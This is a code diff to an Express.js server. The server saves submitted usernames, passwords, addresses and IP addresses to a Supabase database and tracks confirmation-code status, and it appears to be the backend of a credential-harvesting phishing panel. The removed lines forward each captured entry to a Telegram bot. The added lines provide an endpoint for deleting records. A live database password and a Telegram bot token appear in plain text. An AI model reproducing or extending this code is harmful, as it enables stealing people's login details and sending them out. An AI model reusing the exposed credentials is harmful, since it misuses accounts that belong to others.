@@ -1,13 +1,12 @@
 const express = require('express');
 const path = require('path');
 const { Pool } = require('pg');
-const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ==================== SUPABASE CONNECTION ====================
+// Supabase Connection
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
@@ -24,27 +23,6 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
 )`).then(() => console.log("✅ Supabase Connected"))
    .catch(err => console.error("Table Error:", err.message));
 
-// ==================== TELEGRAM CONFIG ====================
-const BOT_TOKEN = "8840000220:AAHAgXsHJVwYQp64ulKVCC7e4AoLvm4YWpY";
-const CHAT_ID = "6728113939";
-
-async function sendTelegramAlert(message) {
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "HTML"
-            })
-        });
-        console.log("📱 Telegram Alert Sent");
-    } catch (err) {
-        console.error("Telegram Error:", err.message);
-    }
-}
-
 function getRealIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
            req.headers['x-real-ip'] ||
@@ -60,11 +38,6 @@ async function saveRecord(type, username = null, password = null, address = null
             [type, username, password, address, ip, timestamp]
         );
         console.log(`✅ SAVED: ${type} | IP: ${ip}`);
-
-        // Send Telegram Alert
-        const alertMsg = `🔔 <b>NEW ACTIVITY</b>\n\nType: ${type}\nIP: ${ip}\nTime: ${timestamp}\nDetails: ${address || username || 'N/A'}`;
-        sendTelegramAlert(alertMsg);
-
     } catch (err) {
         console.error("Save Error:", err.message);
     }
@@ -109,6 +82,19 @@ app.post('/api/confirm-code', async (req, res) => {
         await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
         res.json({ success: true });
     } catch (err) {
+        res.status(500).json({ success: false });
+    }
+});
+
+// Delete Single Record
+app.post('/api/delete-record', async (req, res) => {
+    const { id } = req.body;
+    try {
+        await pool.query("DELETE FROM records WHERE id = $1", [id]);
+        console.log(`🗑️ Record ${id} deleted`);
+        res.json({ success: true });
+    } catch (err) {
+        console.error("Delete Error:", err.message);
         res.status(500).json({ success: false });
     }
 });
